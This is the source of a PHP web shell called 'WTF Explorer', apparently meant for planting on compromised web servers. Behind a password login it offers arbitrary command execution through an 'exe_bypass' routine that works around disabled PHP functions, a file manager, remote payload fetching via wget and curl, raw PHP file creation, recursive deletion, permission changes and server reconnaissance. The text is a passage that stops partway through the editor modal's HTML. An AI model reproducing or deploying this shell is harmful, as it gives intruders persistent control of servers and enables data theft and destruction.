<?php
// Wtf Explorer by 0x6ick - 6ickzone
session_start();
@error_reporting(0);
@set_time_limit(0);

// --- AUTHENTICATION CONFIGURATION ---
$valid_password_hash = '$2a$12$b4rbjQK.jp0vyOClL9M0j.TiVb1Pd3Ms4bPLjVzzGlKOF8UWl4n0S';

$zip_available = class_exists('ZipArchive');

// --- SESSION MANAGEMENT ---
if (isset($_GET['logout'])) {
    unset($_SESSION['gits_login']);
    session_destroy();
    header('Location: ?');
    exit;
}

if (!isset($_SESSION['gits_login'])) {
    if (isset($_POST['pass'])) {
        if (password_verify($_POST['pass'], $valid_password_hash)) {
            $_SESSION['gits_login'] = true;
            header("Location: ?");
            exit;
        } else {
            $login_error = true;
        }
    }
    
    // Login Form Display
    echo '<style>
        body {
            background: #0d1117; color: #c9d1d9; font-family: monospace;
            display: flex; justify-content: center; align-items: center;
            height: 100vh; flex-direction: column; margin: 0;
        }
        form {
            position: relative; background: #161b22;
            border: 1px solid #30363d;
            padding: 30px; width: 300px;
            box-shadow: 0 0 10px rgba(88, 166, 255, 0.1);
            border-radius: 5px; box-sizing: border-box; overflow: hidden;
        }
        form::before {
            content: ""; position: absolute; width: 20px; height: 20px;
            background: #58a6ff; border-radius: 50%;
            top: -10px; left: -10px;
            animation: move-dot 5s linear infinite;
        }
        @keyframes move-dot {
            0% { top: -10px; left: -10px; } 25% { top: -10px; left: 290px; }
            50% { top: 290px; left: 290px; } 75% { top: 290px; left: -10px; }
            100% { top: -10px; left: -10px; }
        }
        h1 { color: #c9d1d9; margin-bottom: 20px; font-weight: 400; text-align: center; }
        input {
            background: #0d1117; color: #c9d1d9;
            border: 1px solid #30363d; padding: 12px; margin-top: 15px;
            width: 100%; box-sizing: border-box; border-radius: 3px;
            transition: border-color 0.3s, box-shadow 0.3s;
        }
        input:focus { border-color: #58a6ff; box-shadow: 0 0 5px rgba(88, 166, 255, 0.3); outline: none; }
        input::placeholder { color: rgba(201, 209, 217, 0.4); }
        input[type=submit] {
            background: #58a6ff; color: #ffffff; font-weight: bold; cursor: pointer;
            border: 1px solid #58a6ff; margin-top: 20px; transition: background-color 0.3s, border-color 0.3s;
            border-radius: 4px;
        }
        input[type=submit]:hover { background: #1f6feb; border-color: #1f6feb; }
        .error { color: #f85149; margin-bottom: 15px; font-weight: bold; }
        .contact { margin-top: 15px; font-size: 0.9em; text-align: center; color: #c9d1d9; }
        .contact a { color: #58a6ff; text-decoration: none; }
        .contact a:hover { text-decoration: underline; }
    </style>';
    // --- Display H1 ---
    echo '<h1>You just do WTF</h1>';

    // --- Error handling ---
    if (isset($login_error)) {
        echo '<div class="error">❌ Damn, suck it all…</div>';
        // Forgot/extra message + Telegram link
        echo '<div class="contact">Are we fucked or what? <a href="https://t.me/yungx6ick" target="_blank">@yungx6ick</a></div>';
    }

    // --- Login Form ---
    echo '<form method="POST">
    <input type="password" name="pass" placeholder="Enter Password">
    <input type="submit" value="Login">
    </form>';

    exit;
}

// File Download Handler
if (isset($_GET['download'])) {
    $filePath = realpath($_GET['download']);
    if ($filePath && is_file($filePath) && is_readable($filePath)) {
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($filePath).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($filePath));
    readfile($filePath);
    exit;
    } else {
        http_response_code(404);
        exit('File not found or not readable.');
    }
}

// Get current directory path
function get_path() { $path = isset($_REQUEST['d']) ? $_REQUEST['d'] : getcwd(); return realpath($path) ? realpath($path) : getcwd(); }
// Format file permissions
function get_perms($file){ 
    $perms = @fileperms($file); 
    if ($perms === false) return '????'; 
    $info = (($perms & 0xC000) == 0xC000) ? 's' : ((($perms & 0xA000) == 0xA000) ? 'l' : ((($perms & 0x8000) == 0x8000) ? '-' : ((($perms & 0x6000) == 0x6000) ? 'b' : ((($perms & 0x4000) == 0x4000) ? 'd' : ((($perms & 0x2000) == 0x2000) ? 'c' : ((($perms & 0x1000) == 0x1000) ? 'p' : 'u')))))); 
    $info .= (($perms & 0x0100) ? 'r' : '-'); $info .= (($perms & 0x0080) ? 'w' : '-'); $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x' ) : (($perms & 0x0800) ? 'S' : '-')); 
    $info .= (($perms & 0x0020) ? 'r' : '-'); $info .= (($perms & 0x0010) ? 'w' : '-'); $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x' ) : (($perms & 0x0400) ? 'S' : '-')); 
    $info .= (($perms & 0x0004) ? 'r' : '-'); $info .= (($perms & 0x0002) ? 'w' : '-'); $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x' ) : (($perms & 0x0200) ? 'T' : '-')); 
    return $info; 
}
// Format file size
function format_size($size) { $units = ['B', 'KB', 'MB', 'GB', 'TB']; for ($i = 0; $size > 1024; $i++) { $size /= 1024; } return round($size, 2) . ' ' . $units[$i]; }
// Delete file or folder recursively
function delete_recursive($target) { if (!file_exists($target)) return true; if (!is_dir($target)) return unlink($target); foreach (scandir($target) as $item) { if ($item == '.' || $item == '..') continue; if (!delete_recursive($target . DIRECTORY_SEPARATOR . $item)) return false; } return rmdir($target); }
// Command execution bypass attempts
function exe_bypass($cmd) {
    $disabled = @ini_get('disable_functions');
    $disabled_array = $disabled ? array_map('trim', explode(',', $disabled)) : [];
    $output = '';

    if (function_exists('shell_exec') && !in_array('shell_exec', $disabled_array)) {
        $output = shell_exec($cmd . ' 2>&1');
        if ($output !== null) return $output ?: 'Command executed successfully with no output.'; }
    if (function_exists('passthru') && !in_array('passthru', $disabled_array)) {
        ob_start(); passthru($cmd . ' 2>&1'); $output = ob_get_clean();
        if ($output !== false) return $output ?: 'Command executed successfully with no output.'; }
    if (function_exists('system') && !in_array('system', $disabled_array)) {
        ob_start(); system($cmd . ' 2>&1'); $output = ob_get_clean();
        if ($output !== false) return $output ?: 'Command executed successfully with no output.'; }
    if (function_exists('exec') && !in_array('exec', $disabled_array)) {
        exec($cmd . ' 2>&1', $lines);
        return implode("\n", $lines) ?: 'Command executed successfully with no output.'; }
    if (function_exists('popen') && !in_array('popen', $disabled_array)) {
        $handle = popen($cmd . ' 2>&1', 'r');
        if ($handle) {
            while (!feof($handle)) { $output .= fread($handle, 1024); }
            pclose($handle);
            return $output ?: 'Command executed successfully with no output.'; }
    }
    return "ERROR: All tested execution methods are disabled or failed.\nDisabled functions: " . ($disabled ?: 'None');
}

// Function to handle bulk zipping 
function zip_items($targets, $zipFileName) {
    global $zip_available;
    if (!$zip_available) return ['status'=>'error','message'=>'PHP ZipArchive not enabled.'];

    $zip = new ZipArchive();
    if ($zip->open($zipFileName, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) {
        return ['status'=>'error','message'=>'Cannot create zip file.'];
    }

    foreach ($targets as $item) {
        if (is_file($item)) {
            $zip->addFile($item, basename($item));
        } elseif (is_dir($item)) {
            // Simplified directory recursion for example
            $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($item));
            foreach ($files as $file) {
                if (!$file->isDir()) {
                    $filePath = $file->getRealPath();
                    $relativePath = substr($filePath, strlen($item)+1);
                    $zip->addFile($filePath, $relativePath);
                }
            }
        }
    }

    $zip->close();
    return ['status'=>'ok','message'=>"Files zipped into ".basename($zipFileName)];
}

// Function to handle unzip action
function unzip_item($target, $path) {
    global $zip_available;
    if (!$zip_available) return ['status' => 'error', 'message' => 'ZipArchive extension is not enabled. Cannot unzip.'];
    
    $zip = new ZipArchive;
    if ($zip->open($target) === TRUE) {
        $extract_path = $path; // Extract to current directory
        if ($zip->extractTo($extract_path)) {
            $zip->close();
            return ['status' => 'ok', 'message' => 'File unzipped successfully!'];
        } else {
            $zip->close();
            return ['status' => 'error', 'message' => 'Failed to extract files. Check directory permissions.'];
        }
    } else {
        return ['status' => 'error', 'message' => 'Failed to open zip file.'];
    }
}


// --- AJAX API BLOCK ---
if (isset($_GET['ajax'])) {
    header('Content-Type: application/json');
    $path = get_path();
    $action = isset($_GET['action']) ? $_GET['action'] : 'list';
    $response = ['status' => 'error', 'message' => 'Unknown action'];

    switch ($action) {
        case 'list':
            $folders = []; $files = [];
            if (is_readable($path)) {
                $items = @scandir($path);
                if ($items) {
                    usort($items, function($a, $b) use ($path) {
                        $a_is_dir = is_dir($path . DIRECTORY_SEPARATOR . $a);
                        $b_is_dir = is_dir($path . DIRECTORY_SEPARATOR . $b);
                        if ($a_is_dir && !$b_is_dir) return -1;
                        if (!$a_is_dir && $b_is_dir) return 1;
                        return strcasecmp($a, $b);
                    });
                    foreach ($items as $item) {
                        if ($item == '.') continue;
                        $full_path = $path . DIRECTORY_SEPARATOR . $item;
                        if ($item == '..') {
                            $folders[] = ['name' => '..', 'path' => dirname($path)];
                            continue;
                        }
                        $is_dir = is_dir($full_path);
                        $entry = ['name' => htmlspecialchars($item), 'path' => htmlspecialchars($full_path)];
                        if ($is_dir) {
                            $folders[] = $entry;
                        } else {
                            $entry['size'] = format_size(@filesize($full_path));
                            $entry['perms'] = get_perms($full_path);
                            $entry['mtime'] = date("Y-m-d H:i:s", @filemtime($full_path));
                            $entry['is_writable'] = is_writable($full_path);
                            $entry['is_zip'] = (strtolower(pathinfo($item, PATHINFO_EXTENSION)) === 'zip'); 
                            $files[] = $entry;
                        }
                    }
                }
            }
            $response = ['status' => 'ok', 'path' => htmlspecialchars($path), 'folders' => $folders, 'files' => $files];
            break;

        case 'unzip': 
            $target = isset($_POST['target']) ? $_POST['target'] : '';
            $result = unzip_item($target, $path);
            $response = $result;
            break;
            
        case 'cmd': $cmd = isset($_POST['cmd']) ? $_POST['cmd'] : ''; $output = exe_bypass($cmd); $response = ['status' => 'ok', 'output' => htmlspecialchars($output)]; break;
        case 'delete': $target = isset($_POST['target']) ? $_POST['target'] : ''; if (file_exists($target)) { if (delete_recursive($target)) $response = ['status' => 'ok', 'message' => 'Item deleted!']; else $response = ['status' => 'error', 'message' => 'Failed to delete item!']; } else $response = ['status' => 'error', 'message' => 'Item not found!']; break;
        case 'get_content': $file = isset($_GET['file']) ? $_GET['file'] : ''; if (is_file($file) && is_readable($file)) { $response = ['status' => 'ok', 'content' => file_get_contents($file)]; } else $response = ['status' => 'error', 'message' => 'File not readable.']; break;
        case 'save_content': $file = isset($_POST['file']) ? $_POST['file'] : ''; $content = isset($_POST['content']) ? $_POST['content'] : ''; if ((file_exists($file) && is_writable($file)) || (!file_exists($file) && is_writable(dirname($file)))) { if (file_put_contents($file, $content) !== false) { $response = ['status' => 'ok', 'message' => 'File saved successfully!']; } else { $response = ['status' => 'error', 'message' => 'Failed to save file!']; } } else { $response = ['status' => 'error', 'message' => 'File or directory not writable.']; } break;
        case 'chmod': $target = isset($_POST['target']) ? $_POST['target'] : ''; $mode = isset($_POST['mode']) ? octdec($_POST['mode']) : 0755; if (file_exists($target)) { if (@chmod($target, $mode)) $response = ['status' => 'ok', 'message' => 'Permissions changed!']; else $response = ['status' => 'error', 'message' => 'Failed to change permissions.']; } else $response = ['status' => 'error', 'message' => 'Target not found.']; break;
        case 'rename': $old = isset($_POST['old']) ? $_POST['old'] : ''; $new = isset($_POST['new']) ? dirname($old) . DIRECTORY_SEPARATOR . $_POST['new'] : ''; if (file_exists($old) && $new) { if (@rename($old, $new)) $response = ['status' => 'ok', 'message' => 'Item renamed successfully!']; else $response = ['status' => 'error', 'message' => 'Failed to rename item.']; } else $response = ['status' => 'error', 'message' => 'Invalid input.']; break;
        case 'create': $type = isset($_POST['type']) ? $_POST['type'] : ''; $name = isset($_POST['name']) ? $_POST['name'] : ''; $target_path = $path . DIRECTORY_SEPARATOR . $name; if ($type && $name) { if (file_exists($target_path)) { $response = ['status' => 'error', 'message' => 'Name already exists!']; } else { if ($type === 'file' && @touch($target_path)) { $response = ['status' => 'ok', 'message' => 'File created successfully!']; } elseif ($type === 'dir' && @mkdir($target_path)) { $response = ['status' => 'ok', 'message' => 'Directory created successfully!']; } else $response = ['status' => 'error', 'message' => 'Failed to create, check permissions.']; } } else { $response = ['status' => 'error', 'message' => 'Invalid input.']; } break;
        case 'upload_multiple': $results = []; $totalFiles = count($_FILES['files']['name']); for ($i = 0; $i < $totalFiles; $i++) { if ($_FILES['files']['error'][$i] === UPLOAD_ERR_OK) { $uploadPath = $path . DIRECTORY_SEPARATOR . basename($_FILES['files']['name'][$i]); if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $uploadPath)) { $results[] = ['name' => $_FILES['files']['name'][$i], 'status' => 'ok']; } else { $results[] = ['name' => $_FILES['files']['name'][$i], 'status' => 'error']; } } else { $results[] = ['name' => $_FILES['files']['name'][$i], 'status' => 'error']; } } $response = ['status' => 'ok', 'results' => $results, 'message' => "Uploaded $totalFiles files"]; break;
        case 'bulk_delete': $targets = isset($_POST['targets']) ? json_decode($_POST['targets'], true) : []; $deletedCount = 0; $failed = []; foreach ($targets as $target) { if (delete_recursive($target)) { $deletedCount++; } else { $failed[] = basename($target); } } if ($deletedCount > 0) { $msg = "Successfully deleted $deletedCount item(s)."; if (!empty($failed)) $msg .= " Failed to delete: " . implode(', ', $failed); $response = ['status' => 'ok', 'message' => $msg]; } else { $response = ['status' => 'error', 'message' => 'No items were deleted.']; } break;
        case 'bulk_zip': $targets = isset($_POST['targets']) ? json_decode($_POST['targets'], true) : []; $zipName = isset($_POST['zip_name']) ? $_POST['zip_name'] : 'archive_' . time() . '.zip'; $zipPath = $path . DIRECTORY_SEPARATOR . basename($zipName); $result = zip_items($targets, $zipPath); $response = $result; break;
        case 'get_server_info': $total_space = @disk_total_space(get_path()); $free_space = @disk_free_space(get_path()); $response = [ 'status' => 'ok', 'os' => php_uname(), 'php_version' => PHP_VERSION, 'user' => get_current_user(), 'server_ip' => @$_SERVER['SERVER_ADDR'], 'disabled_functions' => ini_get('disable_functions') ?: 'None', 'total_space' => $total_space ? format_size($total_space) : 'N/A', 'free_space' => $free_space ? format_size($free_space) : 'N/A' ]; break;
        case 'upload_wget': $url = isset($_POST['url']) ? $_POST['url'] : ''; $filename = isset($_POST['filename']) && !empty($_POST['filename']) ? $_POST['filename'] : basename($url); $target_path = $path . DIRECTORY_SEPARATOR . $filename; $cmd = "wget -O " . escapeshellarg($target_path) . " " . escapeshellarg($url); $output = exe_bypass($cmd); if (file_exists($target_path) && filesize($target_path) > 0) { $response = ['status' => 'ok', 'message' => "File downloaded via wget!\nOutput:\n$output"]; } else { @unlink($target_path); $response = ['status' => 'error', 'message' => "Failed to download file.\nOutput:\n$output"]; } break;
        case 'upload_curl': $url = isset($_POST['url']) ? $_POST['url'] : ''; $filename = isset($_POST['filename']) && !empty($_POST['filename']) ? $_POST['filename'] : basename($url); $target_path = $path . DIRECTORY_SEPARATOR . $filename; $cmd = "curl -L -o " . escapeshellarg($target_path) . " " . escapeshellarg($url); $output = exe_bypass($cmd); if (file_exists($target_path) && filesize($target_path) > 0) { $response = ['status' => 'ok', 'message' => "File downloaded via curl!\nOutput:\n$output"]; } else { @unlink($target_path); $response = ['status' => 'error', 'message' => "Failed to download file.\nOutput:\n$output"]; } break;
        case 'upload_raw': $filename = isset($_POST['filename']) ? $_POST['filename'] : ''; $content = isset($_POST['content']) ? $_POST['content'] : ''; $target_path = $path . DIRECTORY_SEPARATOR . $filename; if (empty($filename)) { $response = ['status' => 'error', 'message' => 'Filename cannot be empty!']; break; } if ((file_exists($target_path) && is_writable($target_path)) || (!file_exists($target_path) && is_writable($path))) { if (file_put_contents($target_path, $content) !== false) { $response = ['status' => 'ok', 'message' => 'Raw file created successfully!']; } else { $response = ['status' => 'error', 'message' => 'Failed to save file!']; } } else { $response = ['status' => 'error', 'message' => 'File or directory not writable.']; } break;
        default: $response = ['status' => 'error', 'message' => 'Invalid action!']; break;
    }
    
    echo json_encode($response);
    exit();
}
?>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WTF Explorer - 6ickZone</title>
    <link href="https://fonts.googleapis.com/css2?family=Roboto+Mono:wght@400;700&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" rel="stylesheet">
    <style>
    :root { 
        /* --- Theme--- */
        --bg: #0d1117; 
        --sidebar-bg: #161b22; 
        --text: #c9d1d9; 
        --muted: #8b949e; 
        --border: #30363d; 
        --accent: #58a6ff; 
        --hover: #1f6feb; 
        --success: #2da44e; 
        --error: #f85149; 
        --font: 'Roboto Mono', monospace; 
    }

    /* --- BASE STYLES --- */
    body { 
        font-family: var(--font); 
        background: var(--bg); 
        color: var(--text); 
        margin: 0; 
        font-size: 14px; 
    }
    
    a { 
        color: var(--accent); 
        text-decoration: none; 
    }
    
    a:hover { 
        color: var(--hover); 
    }

    /* Styling tombol default (ini yang perlu di-override) */
    button, .button { 
        background: var(--accent); 
        border: black; 
        padding: 8px 15px; 
        cursor: pointer; 
        color: #fff; 
        font-weight: bold; 
        border-radius: 4px; 
    }
    
    button:hover, .button:hover { 
        background: var(--hover); 
    }

    /* --- LAYOUT & STRUCTURE --- */
    .container { 
        display: flex; 
        height: 100vh; 
    }
    
    .main-content { 
        flex-grow: 1; 
        display: flex; 
        flex-direction: column; 
    }

    /* --- SIDEBAR --- */
    .sidebar { 
        width: 25%; 
        max-width: 350px; 
        min-width: 250px; 
        background: var(--sidebar-bg); 
        border-right: 1px solid var(--border); 
        display: flex; 
        flex-direction: column; 
    }
    
    .sidebar-header { 
        padding: 15px; 
        border-bottom: 1px solid var(--border); 
        overflow-y: auto; 
    }
    
    .sidebar-content { 
        padding: 15px; 
        overflow-y: auto; 
        flex-grow: 1; 
        border-bottom: 1px solid var(--border); 
    }
    
    .sidebar-footer { 
        padding: 15px; 
        overflow-y: auto; 
        max-height: 250px; 
    }

    /* Folder List */
    .folder-list a { 
        display: block; 
        padding: 8px; 
        border-radius: 4px; 
        margin-bottom: 2px; 
        white-space: nowrap; 
        overflow: hidden; 
        text-overflow: ellipsis; 
    }
    
    .folder-list a:hover { 
        background: var(--border); 
    }

    /* Upload Zone */
    .upload-zone { 
        border: 2px dashed var(--border); 
        border-radius: 8px; 
        padding: 30px; 
        text-align: center; 
        margin-bottom: 15px; 
        cursor: pointer; 
        transition: all 0.3s; 
    }
    
    .upload-zone:hover { 
        border-color: var(--accent); 
        background: rgba(88, 166, 255, 0.05); 
    }
    
    .system-info { 
        background: var(--bg); 
        padding: 10px; 
        border-radius: 5px; 
        margin-top: 20px; 
        max-height: 200px; 
        overflow-y: auto; 
        font-size: 14px; 
        line-height: 1.4; 
    }

    /* --- TOP BAR (Path & CMD) --- */
    .top-bar { 
        display: flex; 
        align-items: center; 
        padding: 10px 15px; 
        background: var(--sidebar-bg); 
        border-bottom: 1px solid var(--border); 
    }
    
    /* Path Actions (Refresh, dll.) */
    .path-actions button { 
        background: none; 
        border: 1px solid var(--border); 
        color: var(--text); 
        padding: 5px 10px; 
        margin-right: 5px; 
        cursor: pointer; 
        border-radius: 4px; 
    }
    
    .path-actions button:hover { 
        background: var(--border); 
        color: var(--accent); 
    }
    
    /* Path Bar */
    .path-bar-container { 
        flex-grow: 1; 
        background: var(--bg); 
        border: 1px solid var(--border); 
        border-radius: 4px; 
        padding: 5px 10px; 
        cursor: text; 
    }
    
    .path-bar { 
        white-space: nowrap; 
        overflow-x: auto; 
    }
    
    .path-bar.hidden, #path-input.hidden { 
        display: none; 
    }
    
    #path-input { 
        width: 100%; 
        background: transparent; 
        border: none; 
        color: var(--text); 
        padding: 0; 
        margin: 0; 
        font-size: 1em; 
        font-family: var(--font); 
    }
    
    .path-part { 
        color: var(--accent); 
        cursor: pointer; 
    }
    
    .path-part:hover { 
        color: var(--hover); 
    }
    
    .path-sep { 
        margin: 0 5px; 
        color: var(--muted); 
    }
    
    /* CMD Execution */
    .cmd-container { 
        padding: 15px; 
        background: var(--sidebar-bg); 
        border-bottom: 1px solid var(--border); 
    }
    
    #cmd-form { 
        display: flex; 
        gap: 10px; 
    }
    
    #cmd-input { 
        flex-grow: 1; 
    }
    
    #cmd-output { 
        margin-top: 10px; 
        background: var(--bg); 
        padding: 10px; 
        border-radius: 4px; 
        max-height: 25vh; 
        overflow-y: auto; 
        white-space: pre-wrap; 
        word-wrap: break-word; 
    }

    /* --- FILE LIST & TABLE --- */
    .file-list-container { 
        overflow-y: auto; 
        flex-grow: 1; 
    }
    
    .file-table { 
        width: 100%; 
        border-collapse: collapse; 
    }
    
    .file-table th, .file-table td { 
        padding: 10px 15px; 
        text-align: left; 
        border-bottom: 1px solid var(--border); 
    }
    
    .file-table th { 
        font-weight: 700; 
        color: var(--muted); 
    }
    
    .file-table tr:hover { 
        background: rgba(88, 166, 255, 0.1); 
    }

    /* ICONS & PERMISSIONS */
    .fa-solid.fa-folder, .fa-solid.fa-arrow-up { 
        color: #58a6ff; 
        margin-right: 8px; 
    } 
    
    .fa-regular.fa-file-lines { 
        color: #8b949e; 
        margin-right: 8px;
    }
    
    .fa-solid.fa-file-zipper { 
        color: #f1c40f; 
        margin-right: 8px;
    } 

    .perms.writable { 
        color: var(--success); 
    } 
    
    .perms.not-writable { 
        color: var(--error); 
    }

    /* INPUTS & MODALS */
    .modal-overlay { 
        position: fixed; 
        top: 0; 
        left: 0; 
        width: 100%; 
        height: 100%; 
        background: rgba(0,0,0,0.7); 
        display: none; 
        justify-content: center; 
        align-items: center; 
        z-index: 1000; 
    }
    
    .modal-content { 
        background: var(--sidebar-bg); 
        padding: 20px; 
        border-radius: 5px; 
        border: 1px solid var(--border); 
        min-width: 50vw; 
        max-width: 80vw; 
    }
    
    .modal-content h3 { 
        margin-top: 0; 
    }
    
    textarea { 
        width: 100%; 
        height: 40vh; 
        background: var(--bg); 
        color: var(--text); 
        border: 1px solid var(--border); 
        font-family: var(--font); 
        box-sizing: border-box; 
    }
    
    input[type=text], input[type=file] { 
        background: var(--bg); 
        border: 1px solid var(--border); 
        color: var(--text); 
        padding: 8px; 
        border-radius: 4px; 
        box-sizing: border-box; 
    }
    
    /* TOAST NOTIFICATION */
    .toast-notification { 
        position: fixed; 
        bottom: 20px; 
        left: 50%; 
        transform: translateX(-50%); 
        padding: 10px 20px; 
        border-radius: 5px; 
        color: #fff; 
        font-weight: bold; 
        z-index: 2000; 
        opacity: 0; 
        transition: opacity 0.5s, bottom 0.5s; 
    }
    
    .toast-notification.show { 
        opacity: 1; 
        bottom: 40px; 
    }
    
    .toast-notification.success { 
        background: var(--success); 
    }
    
    .toast-notification.error { 
        background: var(--error); 
    }

    /* --- CUSTOM: BULK ACTIONS & ACTIONS MENU (Header) --- */
    .bulk-actions { 
        background: none !important; 
        border: none !important;
        padding: 10px 15px 10px 15px !important;
    }
    
    .bulk-actions input[type=checkbox] { 
        width: auto; 
        margin: 0; 
        vertical-align: middle; 
    }
    
    .bulk-actions button {
        background: none !important; 
        border: 1px solid var(--border); 
        color: var(--text) !important; 
        font-weight: normal; 
        padding: 5px 10px; 
        border-radius: 4px;
        transition: all 0.2s;
    }
    
    /* Bulk Delete */
    #bulk-delete-btn { 
        border-color: var(--error); 
        color: var(--error) !important; 
    }
    
    #bulk-delete-btn:hover { 
        background: rgba(248, 81, 73, 0.1) !important; 
    }
    
    /* Bulk Zip */
    #bulk-zip-btn { 
        border-color: var(--success); 
        color: var(--success) !important; 
    }
    
    #bulk-zip-btn:hover { 
        background: rgba(45, 164, 78, 0.1) !important; 
    }

    /* ACTIONS MENU (Sidebar) */
    .actions-menu button, 
    .actions-menu a { 
        background: none !important;
        border: none !important;
        color: var(--text);
        padding: 0;
        margin: 0 5px; 
        font-size: 1em;
        cursor: pointer;
        text-decoration: none;
        outline: none;
    }

    .actions-menu button:hover, 
    .actions-menu a:hover {
        color: var(--accent); 
        background: none !important; 
    }
    
    .file-table td.actions-menu button,
    .file-table td.actions-menu a {
        background: none !important; 
        border: none !important;
        
        color: var(--muted) !important; 
        
        padding: 0 4px !important; 
        margin: 0;
        
        font-weight: normal !important; 
        
        transition: color 0.2s, text-shadow 0.2s;
    }

    .file-table td.actions-menu button:hover,
    .file-table td.actions-menu a:hover,
    .file-table td.actions-menu button:focus,
    .file-table td.actions-menu a:focus {
        color: var(--accent) !important;
        /* Calm Glow Effect */
        text-shadow: 0 0 5px rgba(88, 166, 255, 0.7); 
        background: none !important;
    }

    /* Custom warna untuk Delete (X) */
    .file-table td.actions-menu button[title="Delete"] {
        color: var(--error) !important;
    }

    /* Custom warna dan glow untuk Delete saat hover */
    .file-table td.actions-menu button[title="Delete"]:hover {
        color: #ff9999 !important; 
        text-shadow: 0 0 5px rgba(248, 81, 73, 0.7);
    }
    
    /* --- MOBILE RESPONSIVENESS --- */
    @media (max-width: 768px) {
        .container { 
            flex-direction: column; 
        }
        
        .sidebar { 
            width: 100%; 
            max-width: none; 
            min-width: 100%; 
            border-right: none; 
            border-bottom: 1px solid var(--border); 
        }
        
        .top-bar { 
            flex-wrap: wrap; 
        }
        
        .path-actions { 
            order: 2; 
            margin-top: 10px; 
            width: 100%; 
        }
        
        .path-bar-container { 
            order: 1; 
        }
        
        .file-table thead { 
            display: none; 
        }
        
        .file-table td { 
            display: block; 
            text-align: right; 
            padding-left: 10px; 
        }
        
        .file-table td:before { 
            content: attr(data-label); 
            float: left; 
            font-weight: bold; 
            color: var(--muted); 
        }
        
        .file-table tr { 
            display: block; 
            margin-bottom: 10px; 
            border: 1px solid var(--border); 
            border-radius: 4px; 
        }
        
        .actions-menu { 
            text-align: right; 
            border-top: 1px solid var(--border); 
            padding-top: 5px; 
            margin-top: 5px;
        }
    }
</style>
</head>
<body>
<div class="container">
    <div class="sidebar">
        <div class="sidebar-header">
            <h3><i class="fa-solid fa-terminal"></i>you just do WTF you want to</h3>
            <div style="font-size: 12px;"><a href="?logout=1">Logout</a></div>
            
            <div class="upload-zone" id="upload-zone">
                <i class="fa-solid fa-cloud-arrow-up"></i>
                <div>Drag & Drop Files Here</div>
                <div style="font-size:0.8em; margin-top:5px;">or click to select</div>
            </div>
            <input type="file" name="files[]" id="file-input" multiple style="display:none;">
            
            <div class="upload-progress" id="upload-progress" style="display:none;">
                <div class="progress-bar">
                    <div class="progress-fill" id="overall-progress" style="width:0%"></div>
                </div>
                <div class="upload-stats" id="upload-stats">Ready to upload...</div>
                <button type="button" id="upload-btn" style="width:100%; margin-top:10px;">Upload All Files</button>
                <div class="file-list" id="upload-file-list"></div>
            </div>

            <div class="upload-methods" style="margin-top: 20px;">
                <h4 style="border-bottom: 1px solid var(--border); padding-bottom: 5px;">Alternative Uploads</h4>
                
                <form id="wget-form" style="margin-bottom: 10px;">
                    <input type="text" name="wget_url" id="wget-url" placeholder="https://example.com/file.txt" required style="width: 100%; margin-bottom: 5px;">
                    <input type="text" name="wget_filename" id="wget-filename" placeholder="filename (optional)" style="width: 100%; margin-bottom: 5px;">
                    <button type="submit" style="width:100%;"><i class="fa-solid fa-download"></i> Upload via wget</button>
                </form>
                
                <form id="curl-form" style="margin-bottom: 10px;">
                    <input type="text" name="curl_url" id="curl-url" placeholder="https://example.com/file.txt" required style="width: 100%; margin-bottom: 5px;">
                    <input type="text" name="curl_filename" id="curl-filename" placeholder="filename (optional)" style="width: 100%; margin-bottom: 5px;">
                    <button type="submit" style="width:100%;"><i class="fa-solid fa-network-wired"></i> Upload via curl</button>
                </form>
                
                <form id="raw-form">
                    <input type="text" name="raw_filename" id="raw-filename" placeholder="filename.php" required style="width: 100%; margin-bottom: 5px;">
                    <textarea name="raw_content" id="raw-content" placeholder="&lt;?php phpinfo(); ?&gt;" style="width: 100%; height: 60px; margin-bottom: 5px;"></textarea>
                    <button type="submit" style="width:100%;"><i class="fa-solid fa-code"></i> Create Raw File</button>
                </form>
            </div>
        </div>
        
        <div class="sidebar-content">
            <h4>Folders</h4>
            <div class="folder-list" id="folder-list"></div>
        </div>

        <div class="sidebar-footer">
              <h4>Server Info</h4>
              <div id="server-info" class="system-info" style="margin-top:0;">
                  <div>Loading server info...</div>
              </div>
        </div>
    </div>
    
    <div class="main-content">
        <div class="top-bar">
            <div class="path-actions">
                <button id="home-btn" title="Go to root"><i class="fa-solid fa-house"></i></button>
                <button id="up-btn" title="Go up one level"><i class="fa-solid fa-arrow-up"></i></button>
                <button id="create-file-btn" title="Create File"><i class="fa-solid fa-file-circle-plus"></i></button>
                <button id="create-dir-btn" title="Create Directory"><i class="fa-solid fa-folder-plus"></i></button>
                <button id="refresh-btn" title="Refresh"><i class="fa-solid fa-rotate"></i></button>
            </div>
            <div class="path-bar-container">
                <div id="path-bar" class="path-bar"></div>
                <input type="text" id="path-input" class="hidden">
            </div>
        </div>
        <div class="cmd-container">
            <form id="cmd-form">
                <input type="text" id="cmd-input" placeholder="whoami" autocomplete="off">
                <button type="submit">Execute</button>
            </form>
            <pre id="cmd-output" style="display:none;"></pre>
        </div>
        <div class="file-list-container">
            <div class="bulk-actions" style="padding: 10px 15px;">
                <input type="checkbox" id="select-all" title="Select/Deselect All">
                <span style="font-weight: bold;">Bulk Actions:</span>
                <button id="bulk-delete-btn">Delete Selected</button>
                <button id="bulk-zip-btn">Zip Selected</button>
            </div>
            <table class="file-table">
                <thead><tr><th style="width:30px;"></th><th>Name</th><th>Size</th><th>Perms</th><th>Modified</th><th>Actions</th></tr></thead>
                <tbody id="file-list"></tbody>
            </table>
        </div>
    </div>
</div>

<div class="modal-overlay" id="editor-modal">
    <div class="modal-content">
        <h3 id="editor-title">Edit File</h3>
        <form id="editor-form">
            <textarea id="editor-content"></textarea>
            <input type="hidden" id="editor-file-path">
            <div style="margin-top:10px; text-align:right;">
                <button type="button" onclick="closeModal()" style="background:var(--muted);">Cancel</button>
                <button type="submit">Save</button>
